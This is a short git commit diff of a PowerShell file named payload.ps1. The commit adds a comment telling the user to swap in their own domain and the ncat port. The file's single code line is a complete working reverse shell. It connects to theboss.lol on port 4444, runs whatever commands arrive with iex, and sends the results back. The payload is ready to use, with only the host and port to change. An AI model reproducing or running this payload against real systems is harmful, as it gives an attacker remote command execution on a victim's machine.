033faf719c42d3a5efa94b445ce53f82cba44643
davidbombal <davidbombal@gmail.com>
2020-10-27 12:34:21 +0200

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,1 +1,3 @@
+#Change the domain name theboss.lol to your domain name and the port number 4444 to the port number ncat is listening to
+
 $sm=(New-Object Net.Sockets.TCPClient('theboss.lol',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
